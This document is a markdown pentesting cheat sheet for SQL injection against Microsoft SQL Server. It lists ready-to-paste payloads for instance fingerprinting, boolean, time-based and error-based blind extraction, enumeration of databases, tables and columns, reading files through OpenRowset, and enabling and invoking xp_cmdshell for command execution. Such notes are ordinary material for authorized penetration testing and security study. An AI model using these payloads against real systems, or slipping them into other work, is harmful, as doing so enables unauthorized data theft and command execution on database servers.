# SQLi for [Microsoft SQL server](https://www.microsoft.com/en-us/sql-server)

## Things to remember
  *  HackTricks has [multiple](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) [pages](https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection) covering MSSQL
  *  MSSQL supports stacked queries making [`xp_cmdshell`](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) usage more forgiving
  *  `LIKE` operator is **NOT** case sensitive: use `COLLATE` to enforce sensitivity
  *  Boolean and time-based injections are versatile... get creative!

## Common errors
  *  `Subquery returned more than 1 value` fixed by using [`STRING_AGG()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/string-agg-transact-sql?view=sql-server-ver16) to return a single value
  *  `Data is Null. This method or property cannot be called on Null values.` caused by null arguments
      *  Null values may exist within the target table, in this case [filter them out](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/not-equal-to-transact-sql-traditional?view=sql-server-ver16)
      *  Null values may be returned due to incorrect table/schema names, check for typos
  *  `Cannot resolve the collation conflict` fixed by using `COLLATE` so sub-query matches other datasets
      *  This error is easy to cause while attempting `UNION` injections

## DBMS instance details
  *  DBMS version, current user, data directory, hostname, server collation settings, etc.
      *  Data directory used to [store MSSQL stuff](https://learn.microsoft.com/en-us/sql/sql-server/install/file-locations-for-default-and-named-instances-of-sql-server?view=sql-server-ver16&viewFallbackFrom=sql-server-ver22)
      *  [`USER_NAME()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/user-name-transact-sql?view=sql-server-ver16) and [`SUSER_NAME()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-name-transact-sql?view=sql-server-ver16) for enumerating users

```
(SELECT @@version)
(SELECT USER_NAME())
(SELECT SUSER_NAME())
(SELECT SUSER_NAME(1))
(SELECT SERVERPROPERTY('instancedefaultdatapath'))
(SELECT physical_name FROM master.sys.master_files WHERE database_id = 1 AND file_id = 1)
(SELECT HOST_NAME())
(SELECT SERVERPROPERTY('Collation'))
```

## Boolean-based blind
  *  Infer DB contents from true/false responses
  *  A simple way to induce this type of response is to use `OR`/`AND` operators
      *  More complex ways could also exist depending on the application
  *  MSSQL is case-insensitive by default, `COLLATE` to enforce sensitivity
      *  Consider hex encoding to bypass issues with [collation settings](https://learn.microsoft.com/en-us/sql/relational-databases/collations/view-collation-information?view=sql-server-ver16)

```
(SELECT 1 WHERE db_name() LIKE '%')
(SELECT 1 WHERE db_name() COLLATE Latin1_General_CS_AS LIKE '%')
(SELECT 1 WHERE master.sys.fn_varbintohexstr(CAST(db_name() as varbinary)) LIKE '%')
(SELECT 1 WHERE ascii(SUBSTRING(db_name(), 1, 1)) < 127)
```

## Time-based blind
  *  Infer DB contents by forcing the server to wait and measuring response times
  *  [`IF`](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/if-else-transact-sql?view=sql-server-ver16) and [`exists()`](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/exists-transact-sql?view=sql-server-ver16) used to [trigger delay on conditional statement](https://sqlwiki.netspi.com/injectionTypes/blindBased/#sqlserver)
  *  [`WAITFOR DELAY`](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/waitfor-transact-sql?view=sql-server-ver16) is obvious for this, but others may exist
      *  [`GENERATE_SERIES()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/generate-series-transact-sql?view=sql-server-ver16) may be applicable for wasting CPU cycles

```
IF exists((SELECT 1 WHERE db_name() LIKE '%')) WAITFOR DELAY '0:0:5'
IF exists((SELECT 1 WHERE db_name() COLLATE Latin1_General_CS_AS LIKE '%')) WAITFOR DELAY '0:0:5'
IF exists((SELECT 1 WHERE ascii(SUBSTRING(db_name(), 1, 1)) < 127)) WAITFOR DELAY '0:0:5'
```

## Error-based
  *  Cause an MSSQL error that contains the result of a subquery
      *  Useful if errors are rendered on the page
  *  `OR`/`AND` operators useful to include error-causing functions
  *  [PayloadsAllTheThings has a section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based) covering this
  *  [`CONVERT()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16) and [`CAST()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16) used to cause errors by [converting non-compatible data types](https://sqlwiki.netspi.com/injectionTypes/errorBased/#sqlserver)
      *  The function examples listed below are **NOT** used correctly... duh!
  *  Subqueries used to cause errors by returning a non-compatible data type
      *  Ex. Return a `string` into a column meant to for an `int`

```
(CONVERT(int, (SELECT db_name())))
(CAST((SELECT db_name()) AS int))
```

## Enumerate databases, tables, and columns
  *  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-databases) and [NetSPI wiki](https://sqlwiki.netspi.com/attackQueries/informationGathering/#sqlserver) cover more methods
  *  List current database or all databases
      *  `STRING_AGG()` used to return single-value from subquery
  *  List all tables within a given database
  *  List all columns within a given table
      *  Fuzz number of columns using `ORDER BY`/`UNION` operators

```
(SELECT db_name())
(SELECT STRING_AGG(name, ', ') FROM sys.databases)
(SELECT STRING_AGG(name, ', ') FROM exampleDB..sysobjects WHERE xtype = 'U')
(SELECT STRING_AGG(CONCAT(column_name, ':', data_type), ', ') FROM information_schema.columns WHERE table_catalog = 'exampleDB' AND table_name = 'exampleTable')
```

## System interaction
  *  Filesystem access and command execution
  *  Read files from filesystem using [`OpenRowset()`](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16)
      *  Use [`fn_my_permissions()`](https://learn.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver16) function to [check current user permissions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-read-file)
      *  `master.sys.fn_varbintohexstr()` used to easily render file contents on page
  *  Write files/execute commands using [`xp_cmdshell`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution)
      *  Easiest to enable/invoke using stacked queries
      *  [Other methods exist](https://www.red-gate.com/simple-talk/wp-content/uploads/2017/07/spWriteStringTofile.txt) but require creating new stored procedures

```
(SELECT STRING_AGG(permission_name, ', ') COLLATE SQL_Latin1_General_CP1_CI_AS FROM fn_my_permissions(NULL, 'SERVER'))
(SELECT BulkColumn FROM OpenRowset(BULK '/path/to/file', SINGLE_CLOB) AS Contents)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'ping -n 4 192.168.1.169';
```
